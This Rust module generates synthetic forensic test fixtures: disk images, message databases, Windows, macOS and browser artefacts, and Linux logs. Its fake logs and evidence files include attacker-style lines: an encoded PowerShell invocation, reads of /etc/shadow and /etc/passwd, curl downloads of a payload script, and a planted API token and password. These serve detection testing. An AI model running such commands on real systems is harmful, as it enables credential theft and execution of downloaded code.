//! Random forensic test fixtures — NTFS image, SQLite DB, carving payloads, evidence files.

use rand::{rngs::StdRng, Rng, SeedableRng};
use std::io::Write;
use std::path::{Path, PathBuf};

pub struct TestWorkspace {
    pub root: PathBuf,
    pub ntfs_image: PathBuf,
    pub luks_image: PathBuf,
    pub carve_image: PathBuf,
    pub sqlite_db: PathBuf,
    pub evidence_txt: PathBuf,
    pub evidence_png: PathBuf,
    pub carve_output: PathBuf,
}

pub fn generate_workspace(seed: u64) -> TestWorkspace {
    let root = std::env::temp_dir().join(format!("analysisloom_test_{seed}"));
    let _ = std::fs::remove_dir_all(&root);
    std::fs::create_dir_all(&root).unwrap_or_else(|e| panic!("create workspace: {e}"));
    std::fs::create_dir_all(root.join("carved"))
        .unwrap_or_else(|e| panic!("create carved dir: {e}"));

    let mut rng = StdRng::seed_from_u64(seed);

    let ntfs_image = root.join("random_ntfs.dd");
    write_ntfs_image(&ntfs_image, &mut rng);

    let luks_image = root.join("luks_volume.dd");
    write_luks_image(&luks_image, &mut rng);

    let carve_image = root.join("carve_source.dd");
    write_carve_image(&carve_image, &mut rng);

    let sqlite_db = root.join("messages.db");
    write_sqlite_db(&sqlite_db, &mut rng);

    let evidence_txt = root.join("secret_password_log.txt");
    write_evidence_text(&evidence_txt, &mut rng);

    let evidence_png = root.join("photo_evidence.png");
    write_minimal_png(&evidence_png);

    TestWorkspace {
        root: root.clone(),
        ntfs_image,
        luks_image,
        carve_image,
        sqlite_db,
        evidence_txt,
        evidence_png,
        carve_output: root.join("carved"),
    }
}

fn ntfs_timestamp_bytes() -> [u8; 8] {
    let unix = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_else(|_| panic!("time since unix epoch"))
        .as_secs() as i64;
    let ntfs = (unix + 11_644_473_600) * 10_000_000;
    ntfs.to_le_bytes()
}

fn write_ntfs_boot_sector(buf: &mut [u8], mft_cluster: u64) {
    buf[3..11].copy_from_slice(b"NTFS    ");
    buf[11..13].copy_from_slice(&512u16.to_le_bytes());
    buf[13] = 8;
    buf[48..56].copy_from_slice(&mft_cluster.to_le_bytes());
}

fn write_mft_record(buf: &mut [u8], filename: &str, parent: u64, is_directory: bool) {
    buf[0..4].copy_from_slice(b"FILE");
    buf[20..22].copy_from_slice(&56u16.to_le_bytes());
    buf[22..24].copy_from_slice(&1u16.to_le_bytes());

    let t = ntfs_timestamp_bytes();
    let name_utf16: Vec<u16> = filename.encode_utf16().collect();
    let fn_content_len = 66 + name_utf16.len() * 2;
    let fn_attr_len = 24 + fn_content_len;
    let si_len = 72usize;
    let total_attrs = si_len + fn_attr_len + 4;

    let mut pos = 56usize;

    // $STANDARD_INFORMATION
    buf[pos..pos + 4].copy_from_slice(&0x10u32.to_le_bytes());
    buf[pos + 4..pos + 8].copy_from_slice(&(si_len as u32).to_le_bytes());
    buf[pos + 8] = 0;
    buf[pos + 16..pos + 20].copy_from_slice(&48u32.to_le_bytes());
    buf[pos + 20..pos + 22].copy_from_slice(&24u16.to_le_bytes());
    let si = pos + 24;
    buf[si..si + 8].copy_from_slice(&t);
    buf[si + 8..si + 16].copy_from_slice(&t);
    buf[si + 24..si + 32].copy_from_slice(&t);
    pos += si_len;

    // $FILE_NAME
    buf[pos..pos + 4].copy_from_slice(&0x30u32.to_le_bytes());
    buf[pos + 4..pos + 8].copy_from_slice(&(fn_attr_len as u32).to_le_bytes());
    buf[pos + 8] = 0;
    buf[pos + 16..pos + 20].copy_from_slice(&(fn_content_len as u32).to_le_bytes());
    buf[pos + 20..pos + 22].copy_from_slice(&24u16.to_le_bytes());
    let fn_start = pos + 24;
    buf[fn_start..fn_start + 8].copy_from_slice(&parent.to_le_bytes());
    buf[fn_start + 8..fn_start + 16].copy_from_slice(&t);
    buf[fn_start + 16..fn_start + 24].copy_from_slice(&t);
    let flags = if is_directory { 0x1000_0000u32 } else { 0u32 };
    buf[fn_start + 56..fn_start + 60].copy_from_slice(&flags.to_le_bytes());
    buf[fn_start + 64] = name_utf16.len() as u8;
    for (i, ch) in name_utf16.iter().enumerate() {
        let off = fn_start + 66 + i * 2;
        buf[off..off + 2].copy_from_slice(&ch.to_le_bytes());
    }
    pos += fn_attr_len;

    buf[pos..pos + 4].copy_from_slice(&0xFFFF_FFFFu32.to_le_bytes());
    let _ = total_attrs;
}

fn write_ntfs_image(path: &Path, rng: &mut StdRng) {
    const MFT_CLUSTER: u64 = 4;
    const BYTES_PER_SECTOR: u64 = 512;
    const SECTORS_PER_CLUSTER: u64 = 8;
    const MFT_SCAN_RECORDS: u64 = 256;
    let mft_offset = MFT_CLUSTER * SECTORS_PER_CLUSTER * BYTES_PER_SECTOR;
    let record_size = 1024u64;
    // Parser scans 256 consecutive records from mft_offset — image must cover that span.
    let image_size =
        (mft_offset + record_size * MFT_SCAN_RECORDS + rng.gen_range(0u64..8192)) as usize;

    let mut image = vec![0u8; image_size];
    write_ntfs_boot_sector(&mut image[..512], MFT_CLUSTER);

    let records: Vec<(&str, u64, bool)> = vec![
        (".", 5, true),
        ("Windows", 5, true),
        ("Users", 5, true),
        ("Administrator", 5, true),
        ("secret_password.txt", 5, false),
        ("messages.db", 5, false),
        ("BitLockerToGo", 5, true),
    ];

    for (i, (name, parent, is_dir)) in records.iter().enumerate() {
        let off = (mft_offset + record_size * i as u64) as usize;
        if off + record_size as usize <= image.len() {
            write_mft_record(
                &mut image[off..off + record_size as usize],
                name,
                *parent,
                *is_dir,
            );
        }
    }

    // Random padding with JPEG for carving overlap test inside NTFS image
    let jpeg_off = (mft_offset + record_size * 16) as usize;
    if jpeg_off + 4 < image.len() {
        image[jpeg_off..jpeg_off + 3].copy_from_slice(&[0xFF, 0xD8, 0xFF]);
    }

    let mut f = std::fs::File::create(path).unwrap_or_else(|e| panic!("create ntfs image: {e}"));
    f.write_all(&image)
        .unwrap_or_else(|e| panic!("write ntfs image: {e}"));
}

fn write_luks_image(path: &Path, rng: &mut StdRng) {
    let mut data = vec![0u8; 65536];
    data[0..6].copy_from_slice(b"LUKS\xba\xbe");
    rng.fill(&mut data[512..]);
    std::fs::write(path, &data).unwrap_or_else(|e| panic!("write luks image: {e}"));
}

fn write_carve_image(path: &Path, rng: &mut StdRng) {
    let mut data = vec![0u8; 256 * 1024];
    rng.fill(&mut data[..]);
    // Embed PNG + PDF + SQLite signatures
    data[4096..4096 + 8].copy_from_slice(b"\x89PNG\r\n\x1a\n");
    data[12000..12000 + 4].copy_from_slice(b"%PDF");
    data[24000..24000 + 15].copy_from_slice(b"SQLite format 3");
    std::fs::write(path, &data).unwrap_or_else(|e| panic!("write carve image: {e}"));
}

fn write_sqlite_db(path: &Path, rng: &mut StdRng) {
    let conn = rusqlite::Connection::open(path).unwrap_or_else(|e| panic!("open sqlite: {e}"));
    conn.execute_batch(
        "CREATE TABLE messages (id INTEGER PRIMARY KEY, sender TEXT, message TEXT, timestamp INTEGER);
         CREATE TABLE contacts (id INTEGER PRIMARY KEY, name TEXT, phone TEXT);",
    )
    .unwrap_or_else(|e| panic!("schema: {e}"));

    for i in 0..15 {
        let sender = format!("+628{:08}", rng.gen_range(10_000_000..99_999_999));
        let msg = format!("Random forensic message #{i} password token");
        conn.execute(
            "INSERT INTO messages (sender, message, timestamp) VALUES (?1, ?2, ?3)",
            rusqlite::params![sender, msg, 1_700_000_000 + i],
        )
        .unwrap_or_else(|e| panic!("insert message: {e}"));
    }
    conn.execute(
        "INSERT INTO contacts (name, phone) VALUES ('Suspect A', '+62812345678')",
        [],
    )
    .unwrap_or_else(|e| panic!("insert contact: {e}"));
}

fn write_evidence_text(path: &Path, rng: &mut StdRng) {
    let mut lines = vec![
        "CONFIDENTIAL forensic export".into(),
        "user password=RandomP@ss123!".into(),
        "powershell -NoProfile -enc SQBFAFgA".into(),
        "api_token=sk-live-".to_string() + &hex::encode(&rng.gen::<[u8; 8]>()),
    ];
    for i in 0..rng.gen_range(5..20) {
        lines.push(format!("log line {i}: random data {}", rng.gen::<u32>()));
    }
    std::fs::write(path, lines.join("\n")).unwrap_or_else(|e| panic!("write evidence: {e}"));
}

fn write_minimal_png(path: &Path) {
    // Minimal valid 1x1 PNG
    let png: &[u8] = &[
        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44,
        0x52, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x00, 0x00, 0x00, 0x90,
        0x77, 0x53, 0xDE, 0x00, 0x00, 0x00, 0x0C, 0x49, 0x44, 0x41, 0x54, 0x08, 0xD7, 0x63, 0xF8,
        0xCF, 0xC0, 0x00, 0x00, 0x03, 0x01, 0x01, 0x00, 0x18, 0xDD, 0x8D, 0xB4, 0x00, 0x00, 0x00,
        0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82,
    ];
    std::fs::write(path, png).unwrap_or_else(|e| panic!("write png: {e}"));
}

/// Extra fixtures for README screenshots (browser DB, registry hive, Volatility JSON).
pub fn write_screenshot_extras(dest: &Path) {
    std::fs::create_dir_all(dest.join("carved_out"))
        .unwrap_or_else(|e| panic!("create carved_out: {e}"));
    write_minimal_system_hive(&dest.join("SYSTEM"));
    write_volatility_json(&dest.join("volatility.json"));
    write_browser_profile(&dest.join("browser_profile"));
    write_synthetic_evtx(&dest.join("Security.evtx"));
    write_synthetic_pcap(&dest.join("capture.pcap"));
    write_macos_profile(&dest.join("macos_profile"));
}

/// V2 forensic test fixtures.
pub fn write_v2_extras(dest: &Path) {
    write_synthetic_evtx(&dest.join("Security.evtx"));
    write_synthetic_pcap(&dest.join("capture.pcap"));
    write_macos_profile(&dest.join("macos_profile"));
    write_v21_extras(dest);
}

/// V2.1 backlog fixtures — Windows artifacts, stego, email, chat, Linux.
pub fn write_v21_extras(dest: &Path) {
    let prefetch_dir = dest.join("Windows/Prefetch");
    std::fs::create_dir_all(&prefetch_dir).unwrap_or_else(|e| panic!("prefetch dir: {e}"));
    write_synthetic_prefetch(&prefetch_dir.join("NOTEPAD.EXE-ABC123.pf"));
    write_synthetic_lnk(&dest.join("recent/notepad.lnk"));
    write_synthetic_jump_list(
        &dest.join("AutomaticDestinations-ms/f01b4d95cf55d32a.automaticDestinations-ms"),
    );
    write_stego_png(&dest.join("stego_sample.png"));
    write_synthetic_pst(&dest.join("mailbox.pst"));
    write_whatsapp_db(&dest.join("whatsapp/msgstore.db"));
    write_linux_logs(&dest.join("linux_logs"));
    write_cross_platform_acquisition(dest);
}

/// Combined Windows + Linux + macOS indicators for acquisition detection tests.
pub fn write_cross_platform_acquisition(dest: &Path) {
    let evtx = dest.join("Windows/Logs/Security.evtx");
    std::fs::create_dir_all(evtx.parent().unwrap_or_else(|| panic!("evtx parent")))
        .unwrap_or_else(|e| panic!("windows logs dir: {e}"));
    write_synthetic_evtx(&evtx);
    write_synthetic_prefetch(&dest.join("Windows/Prefetch/EXPLORER.EXE-DEF456.pf"));
    write_linux_logs(&dest.join("var/log"));
    write_macos_profile(&dest.join("Users/analyst/Library"));
    write_browser_profile(&dest.join("Users/analyst/AppData/Local"));
}

fn write_synthetic_prefetch(path: &Path) {
    let mut data = vec![0u8; 0x100];
    data[0..4].copy_from_slice(b"SCCA");
    data[4..8].copy_from_slice(&30u32.to_le_bytes());
    let name = "NOTEPAD.EXE";
    for (i, ch) in name.encode_utf16().enumerate() {
        let off = 0x10 + i * 2;
        data[off..off + 2].copy_from_slice(&ch.to_le_bytes());
    }
    data[0x48..0x4C].copy_from_slice(&12u32.to_le_bytes());
    std::fs::write(path, data).unwrap_or_else(|e| panic!("write prefetch: {e}"));
}

fn write_synthetic_lnk(path: &Path) {
    std::fs::create_dir_all(path.parent().unwrap_or_else(|| panic!("lnk parent")))
        .unwrap_or_else(|e| panic!("lnk dir: {e}"));
    let target = "C:\\Windows\\System32\\notepad.exe";
    let mut data = vec![0u8; 0x200];
    data[0..4].copy_from_slice(&0x4Cu32.to_le_bytes());
    data[0x14..0x18].copy_from_slice(&0x02u32.to_le_bytes()); // HasLinkInfo
    let link_info_size = 0x50u32;
    data[0x4C..0x50].copy_from_slice(&link_info_size.to_le_bytes());
    data[0x5C..0x60].copy_from_slice(&0x1Cu32.to_le_bytes());
    let local_off = 0x1Cu32;
    data[0x60..0x64].copy_from_slice(&local_off.to_le_bytes());
    let base = 0x4C + 0x1C;
    data[base..base + target.len()].copy_from_slice(target.as_bytes());
    std::fs::write(path, data).unwrap_or_else(|e| panic!("write lnk: {e}"));
}

fn write_synthetic_jump_list(path: &Path) {
    std::fs::create_dir_all(path.parent().unwrap_or_else(|| panic!("jl parent")))
        .unwrap_or_else(|e| panic!("jl dir: {e}"));
    let mut data = vec![0u8; 512];
    data[0..8].copy_from_slice(&[0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1]);
    let path_utf16: Vec<u8> = "C:\\Users\\Analyst\\Documents\\report.docx"
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    data[128..128 + path_utf16.len()].copy_from_slice(&path_utf16);
    std::fs::write(path, data).unwrap_or_else(|e| panic!("write jump list: {e}"));
}

fn write_stego_png(path: &Path) {
    let mut png = vec![
        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44,
        0x52, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x10, 0x08, 0x02, 0x00, 0x00, 0x00, 0x90,
        0x91, 0x68, 0x36,
    ];
    let mut idat = vec![0u8; 256];
    for (i, b) in idat.iter_mut().enumerate() {
        *b = if i % 3 == 0 { 0xFE } else { 0xFF };
    }
    let chunk_len = (idat.len() as u32).to_be_bytes();
    png.extend_from_slice(&chunk_len);
    png.extend_from_slice(b"IDAT");
    png.extend_from_slice(&idat);
    png.extend_from_slice(&0u32.to_be_bytes());
    png.extend_from_slice(&[
        0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82,
    ]);
    let secret = b"hidden";
    png.extend_from_slice(secret);
    std::fs::write(path, png).unwrap_or_else(|e| panic!("write stego png: {e}"));
}

fn write_synthetic_pst(path: &Path) {
    let mut data = vec![0u8; 0x2000];
    data[0..4].copy_from_slice(&0x4E444221u32.to_le_bytes());
    data[10..12].copy_from_slice(&23u16.to_le_bytes());
    let header = "Subject: Quarterly Report Review\nFrom: cfo@corp.example.com\nTo: analyst@corp.example.com\nDate: 2026-06-01\nBody: Please review attached financials.\0";
    data[0x400..0x400 + header.len()].copy_from_slice(header.as_bytes());
    let folder = "Inbox\0Sent Items\0";
    data[0x800..0x800 + folder.len()].copy_from_slice(folder.as_bytes());
    std::fs::write(path, data).unwrap_or_else(|e| panic!("write pst: {e}"));
}

fn write_whatsapp_db(path: &Path) {
    std::fs::create_dir_all(path.parent().unwrap_or_else(|| panic!("wa parent")))
        .unwrap_or_else(|e| panic!("wa dir: {e}"));
    let _ = std::fs::remove_file(path);
    let conn = rusqlite::Connection::open(path).unwrap_or_else(|e| panic!("wa db: {e}"));
    conn.execute_batch(
        "CREATE TABLE messages (
            _id INTEGER PRIMARY KEY,
            key_remote_jid TEXT,
            remote_resource TEXT,
            data TEXT,
            timestamp INTEGER,
            media_wa_type INTEGER
        );",
    )
    .unwrap_or_else(|e| panic!("wa schema: {e}"));
    conn.execute(
        "INSERT INTO messages (key_remote_jid, remote_resource, data, timestamp, media_wa_type) VALUES (?1, ?2, ?3, ?4, ?5)",
        rusqlite::params![
            "1234567890@s.whatsapp.net",
            "+1234567890",
            "Meeting moved to 3pm — confirm attendance",
            1_700_000_000_000i64,
            0i64
        ],
    )
    .unwrap_or_else(|e| panic!("wa insert: {e}"));
}

fn write_linux_logs(root: &Path) {
    std::fs::create_dir_all(root).unwrap_or_else(|e| panic!("linux dir: {e}"));
    std::fs::write(
        root.join("auth.log"),
        "Jun  6 10:15:01 workstation sshd[1234]: Accepted password for analyst from 192.168.1.50 port 22\n\
         Jun  6 10:16:44 workstation sshd[1235]: Failed password for invalid user admin from 10.0.0.99 port 4444\n\
         Jun  6 10:17:02 workstation sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/bin/cat /etc/shadow\n",
    )
    .unwrap_or_else(|e| panic!("auth.log: {e}"));
    std::fs::write(
        root.join("audit.log"),
        "type=USER_AUTH msg=audit(1717665301.123:456): pid=1234 uid=0 auid=1000 ses=1 subj=unconfined msg='op=PAM:authentication grantors=pam_unix acct=analyst exe=/usr/sbin/sshd'\n\
         type=EXECVE msg=audit(1717665400.456:789): pid=5678 uid=1000 auid=1000 ses=1 exe=/usr/bin/curl cmd=curl -s https://example.com/payload.sh\n",
    )
    .unwrap_or_else(|e| panic!("audit.log: {e}"));
    std::fs::write(
        root.join(".bash_history"),
        "ls -la /var/log\nsudo cat /etc/passwd\ncurl -O https://cdn.example.com/tool.sh\nchmod +x tool.sh\n",
    )
    .unwrap_or_else(|e| panic!("bash_history: {e}"));
    std::fs::write(
        root.join("syslog"),
        "Jun  6 10:20:01 workstation sudo: analyst : TTY=pts/0 ; USER=root ; COMMAND=/bin/cat /etc/shadow\n\
         Jun  6 10:21:44 workstation sshd[2001]: Failed password for invalid user root from 10.0.0.55\n",
    )
    .unwrap_or_else(|e| panic!("syslog: {e}"));
    std::fs::write(
        root.join("cron.log"),
        "Jun  6 02:00:01 CRON[999]: (root) CMD (/usr/local/bin/backup.sh)\n",
    )
    .unwrap_or_else(|e| panic!("cron.log: {e}"));
}

/// CollectionLoom-style signed hash_manifest.json for integrity verification tests.
pub fn write_hash_manifest(dest: &Path, evidence_txt: &Path, evidence_png: &Path) -> PathBuf {
    use crate::forensic::{hashing, integrity};
    use ed25519_dalek::SigningKey;

    let txt_hash = hashing::multi_hash_file(evidence_txt.to_string_lossy().as_ref())
        .ok()
        .and_then(|h| h.sha256)
        .unwrap_or_default();
    let png_hash = hashing::multi_hash_file(evidence_png.to_string_lossy().as_ref())
        .ok()
        .and_then(|h| h.sha256)
        .unwrap_or_default();

    let mut manifest = integrity::HashManifest {
        source: Some("CollectionLoom".into()),
        exported_at: Some(chrono::Utc::now().to_rfc3339()),
        manifest_sha256: None,
        public_key: None,
        signature: None,
        files: vec![
            integrity::ManifestFileEntry {
                path: Some(evidence_txt.to_string_lossy().to_string()),
                relative_path: Some("secret_password_log.txt".into()),
                sha256: txt_hash,
                size_bytes: Some(
                    std::fs::metadata(evidence_txt)
                        .map(|m| m.len())
                        .unwrap_or(0),
                ),
                acquired_at: None,
            },
            integrity::ManifestFileEntry {
                path: Some(evidence_png.to_string_lossy().to_string()),
                relative_path: Some("photo_evidence.png".into()),
                sha256: png_hash,
                size_bytes: Some(
                    std::fs::metadata(evidence_png)
                        .map(|m| m.len())
                        .unwrap_or(0),
                ),
                acquired_at: None,
            },
        ],
    };

    // Deterministic test keypair (RFC 8032 / ed25519-dalek test vector)
    let signing_key = SigningKey::from_bytes(&[
        157, 97, 177, 157, 239, 253, 90, 96, 186, 132, 74, 219, 218, 87, 0, 97, 130, 95, 34, 63,
        147, 44, 47, 64, 71, 73, 119, 149, 182, 168, 40, 94,
    ]);
    integrity::sign_manifest(&mut manifest, &signing_key)
        .unwrap_or_else(|e| panic!("sign manifest: {e}"));

    let path = dest.join("hash_manifest.json");
    std::fs::write(
        &path,
        serde_json::to_string_pretty(&manifest)
            .unwrap_or_else(|e| panic!("serialize manifest: {e}")),
    )
    .unwrap_or_else(|e| panic!("write hash_manifest.json: {e}"));
    path
}

fn write_minimal_system_hive(path: &Path) {
    let mut data = vec![0u8; 16384];
    data[0..4].copy_from_slice(b"regf");
    let file_size = data.len() as u32;
    data[0x28..0x2c].copy_from_slice(&file_size.to_le_bytes());
    std::fs::write(path, &data).unwrap_or_else(|e| panic!("write SYSTEM hive: {e}"));
}

fn write_volatility_json(path: &Path) {
    let json = r#"{
  "windows.pslist.PsList": [
    {"PID": 4, "ImageFileName": "System", "PPID": 0, "CreateTime": "2026-06-01 08:00:00"},
    {"PID": 512, "ImageFileName": "explorer.exe", "PPID": 480, "CommandLine": "C:\\Windows\\explorer.exe"},
    {"PID": 2048, "ImageFileName": "powershell.exe", "PPID": 512, "CommandLine": "powershell -enc SQBFAFgA"}
  ],
  "windows.netscan.NetScan": [
    {"PID": 2048, "Proto": "TCP", "LocalAddr": "192.168.1.10:49152", "ForeignAddr": "185.220.101.45:443", "State": "ESTABLISHED"}
  ]
}"#;
    std::fs::write(path, json).unwrap_or_else(|e| panic!("write volatility.json: {e}"));
}

fn write_synthetic_evtx(path: &Path) {
    let mut data = vec![0u8; 16384];
    data[0..7].copy_from_slice(b"ElfFile");
    data[7] = 0;
    let xml = r#"
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing"/>
    <EventID>4624</EventID>
    <TimeCreated SystemTime="2026-06-06T10:00:00.0000000Z"/>
    <Channel>Security</Channel>
    <Level>0</Level>
    <EventRecordID>1001</EventRecordID>
  </System>
  <EventData><Data>Administrator</Data><Data>10.0.0.5</Data></EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>4688</EventID>
    <TimeCreated SystemTime="2026-06-06T10:01:00.0000000Z"/>
    <Channel>Security</Channel>
    <EventRecordID>1002</EventRecordID>
  </System>
  <EventData><Data>powershell.exe</Data></EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>4104</EventID>
    <TimeCreated SystemTime="2026-06-06T10:02:00.0000000Z"/>
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <EventRecordID>1003</EventRecordID>
  </System>
  <EventData><Data>Invoke-Expression</Data></EventData>
</Event>"#;
    let off = 4096;
    let xml_bytes = xml.as_bytes();
    let len = xml_bytes.len().min(data.len() - off);
    data[off..off + len].copy_from_slice(&xml_bytes[..len]);
    std::fs::write(path, &data).unwrap_or_else(|e| panic!("write evtx: {e}"));
}

fn write_synthetic_pcap(path: &Path) {
    let mut buf = vec![];
    // PCAP global header (little-endian)
    buf.extend_from_slice(&0xa1b2_c3d4u32.to_le_bytes());
    buf.extend_from_slice(&2u16.to_le_bytes());
    buf.extend_from_slice(&4u16.to_le_bytes());
    buf.extend_from_slice(&0i32.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());
    buf.extend_from_slice(&65535u32.to_le_bytes());
    buf.extend_from_slice(&1u32.to_le_bytes()); // LINKTYPE_ETHERNET

    // Ethernet + IPv4 + TCP packet (SYN to 443)
    let pkt = vec![
        0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x08, 0x00, 0x45,
        0x00, 0x00, 0x28, 0x00, 0x01, 0x00, 0x00, 0x40, 0x06, 0x00, 0x00, 192, 168, 1, 10, 185,
        220, 101, 45, 0xc0, 0x10, 0x01, 0xbb, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50,
        0x02, 0xff, 0xff, 0x00, 0x00,
    ];
    let ts_sec = 1_700_000_000u32;
    let incl = pkt.len() as u32;
    buf.extend_from_slice(&ts_sec.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());
    buf.extend_from_slice(&incl.to_le_bytes());
    buf.extend_from_slice(&incl.to_le_bytes());
    buf.extend_from_slice(&pkt);

    std::fs::write(path, buf).unwrap_or_else(|e| panic!("write pcap: {e}"));
}

fn write_macos_profile(root: &Path) {
    let kc = root.join("Library/Application Support/KnowledgeC.db");
    std::fs::create_dir_all(kc.parent().unwrap_or_else(|| panic!("kc parent")))
        .unwrap_or_else(|e| panic!("macos dirs: {e}"));
    let _ = std::fs::remove_file(&kc);
    let conn = rusqlite::Connection::open(&kc).unwrap_or_else(|e| panic!("knowledgec: {e}"));
    conn.execute_batch(
        "CREATE TABLE ZOBJECT (Z_PK INTEGER PRIMARY KEY, ZSTARTDATE REAL, ZSTREAMNAME TEXT);
         CREATE TABLE ZHISTORYITEM (Z_PK INTEGER PRIMARY KEY, ZTITLE TEXT, ZURL TEXT);",
    )
    .unwrap_or_else(|e| panic!("kc schema: {e}"));
    conn.execute(
        "INSERT INTO ZOBJECT (ZSTARTDATE, ZSTREAMNAME) VALUES (738000.0, '/Applications/Safari.app')",
        [],
    )
    .unwrap_or_else(|e| panic!("kc insert: {e}"));
    conn.execute(
        "INSERT INTO ZHISTORYITEM (ZTITLE, ZURL) VALUES ('Forensic Search', 'https://github.com')",
        [],
    )
    .unwrap_or_else(|e| panic!("history insert: {e}"));

    let plist_path = root.join("Library/Preferences/com.apple.loginwindow.plist");
    std::fs::create_dir_all(
        plist_path
            .parent()
            .unwrap_or_else(|| panic!("plist parent")),
    )
    .unwrap_or_else(|e| panic!("plist dir: {e}"));
    let plist_xml = r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>lastUserName</key><string>forensic_analyst</string>
  <key>GuestEnabled</key><false/>
</dict></plist>"#;
    std::fs::write(&plist_path, plist_xml).unwrap_or_else(|e| panic!("write plist: {e}"));

    std::fs::create_dir_all(root.join("Library/Logs/DiagnosticMessages.logarchive"))
        .unwrap_or_else(|e| panic!("logarchive: {e}"));
}

fn write_browser_profile(root: &Path) {
    let history = root.join("Google/Chrome/User Data/Default/History");
    std::fs::create_dir_all(history.parent().unwrap_or_else(|| panic!("history parent")))
        .unwrap_or_else(|e| panic!("create browser dirs: {e}"));
    let _ = std::fs::remove_file(&history);
    let conn =
        rusqlite::Connection::open(&history).unwrap_or_else(|e| panic!("open chrome history: {e}"));
    conn.execute_batch(
        "CREATE TABLE urls (id INTEGER PRIMARY KEY, url TEXT, title TEXT, visit_count INTEGER, last_visit_time INTEGER);
         CREATE TABLE downloads (id INTEGER PRIMARY KEY, target_path TEXT, tab_url TEXT, start_time INTEGER);",
    )
    .unwrap_or_else(|e| panic!("chrome schema: {e}"));
    conn.execute(
        "INSERT INTO urls (url, title, visit_count, last_visit_time) VALUES (?1, ?2, ?3, ?4)",
        rusqlite::params![
            "https://mail.google.com",
            "Gmail",
            42i64,
            133_000_000_000_000i64
        ],
    )
    .unwrap_or_else(|e| panic!("insert url: {e}"));
    conn.execute(
        "INSERT INTO downloads (target_path, tab_url, start_time) VALUES (?1, ?2, ?3)",
        rusqlite::params![
            "/Users/Downloads/tool.exe",
            "https://cdn.example.com/tool.exe",
            132_000_000_000_000i64
        ],
    )
    .unwrap_or_else(|e| panic!("insert download: {e}"));
}

mod hex {
    pub fn encode(bytes: &[u8]) -> String {
        bytes.iter().map(|b| format!("{b:02x}")).collect()
    }
}
